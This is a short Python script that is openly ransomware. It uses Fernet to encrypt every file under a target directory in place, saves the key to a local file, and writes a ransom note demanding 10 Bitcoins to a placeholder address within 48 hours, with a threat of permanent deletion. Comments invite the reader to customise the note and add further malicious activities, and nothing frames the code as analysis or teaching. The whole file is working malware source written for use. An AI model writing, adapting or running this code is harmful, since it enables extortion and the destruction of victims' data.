import os
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        data = file.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def encrypt_directory(directory_path, key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def ransom_note():
    # Customize your ransom note message here
    note = '''
    Your files have been encrypted!
    To retrieve your precious data, pay the ransom of 10 Bitcoins to the following address:
    1ABCDEF2GHIJKLMN3OPQRSTU4VWXYZ
    Once the payment is made, contact us at hackers@xyz.com for the decryption key.
    Failure to comply within 48 hours will result in permanent deletion of your files.
    '''
    with open("RANSOM_NOTE.txt", "w") as file:
        file.write(note)

def main():
    generate_key()
    key = open("key.key", "rb").read()
    encrypt_directory("target_directory", key)
    ransom_note()
    # Perform additional actions or malicious activities here

if __name__ == "__main__":
    main()
